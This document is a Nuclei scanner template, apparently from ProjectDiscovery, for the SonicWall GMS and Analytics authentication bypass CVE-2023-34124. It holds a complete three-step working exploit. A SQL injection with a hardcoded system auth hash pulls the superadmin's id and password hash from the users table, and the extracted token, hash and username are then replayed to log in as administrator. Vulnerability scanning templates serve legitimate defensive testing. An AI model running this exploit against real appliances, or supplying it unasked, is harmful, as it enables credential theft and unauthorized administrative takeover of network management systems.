id: sonicwall-gms-analytics-auth-bypass
info:
  name: SonicWall GMS and Analytics Authentication Bypass (CVE-2023-34124)
  author: ProjectDiscoveryAI
  severity: critical
  tags: cve-2023-34124,auth-bypass
  description: |
    SonicWall GMS and Analytics authentication bypass vulnerability.

variables:
  initial_hash: "/J50ZtvLJddOf5FI4nYdMJcX8IQ="

http:
  - id: step-1
    method: GET
    path:
      - "{{BaseURL}}/ws/msw/tenant/%27%20union%20select%20%28select%20ID%20from%20SGMSDB.DOMAINS%20limit%201%29%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%28select%20concat%28id%2C%20%27%3A%27%2C%20password%29%20from%20sgmsdb.users%20where%20active%20%3D%20%271%27%20order%20by%20issuperadmin%20desc%20limit%201%20offset%200%29%2C%27%27%2C%20%27%27%2C%20%27"
    headers:
      Auth: '{"user":"system","hash":"{{initial_hash}}"}'
    extractors:
      - type: regex
        name: token
        part: header
        regex:
          - "security_token=(?P<token>[a-zA-Z0-9]+);"
        internal: true
      - type: regex
        name: passwd
        part: body
        regex:
          - "(?P<passwd>[0-9a-z]{32})"
        internal: true
      - type: regex
        name: username
        part: body
        regex:
          - "\"alias\":\"(?P<username>[a-zA-Z]+)"
        internal: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "security_token="
          - "application/json"
      - type: word
        part: body
        words:
          - "alias"

  - id: step-2
    method: GET
    path:
      - "{{BaseURL}}/appliance/login"
    headers:
      Cookie: "security_token={{token}}"
    extractors:
      - type: regex
        name: cookie
        part: header
        regex:
          - "JSESSIONID=(?P<cookie>[a-zA-Z0-9]+);"
        internal: true
      - type: regex
        name: getPwdHash
        part: body
        regex:
          - "(?P<getPwdHash>[0-9]{32})"
        internal: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

  - id: step-3
    method: POST
    path:
      - "{{BaseURL}}/appliance/applianceMainPage"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: "JSESSIONID={{cookie}}; security_token={{token}}"
    body: "action=login&skipSessionCheck=0&needPwdChange=0&clientHash={{md5(concat(getPwdHash,passwd))}}&password={{passwd}}&applianceUser={{username}}&appliancePassword=Nice%20Try&ctlTimezoneOffset=0"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<title>SonicWall Universal Management Appliance</title>"
      - type: word
        part: body
        words:
          - "Login"
        negative: true
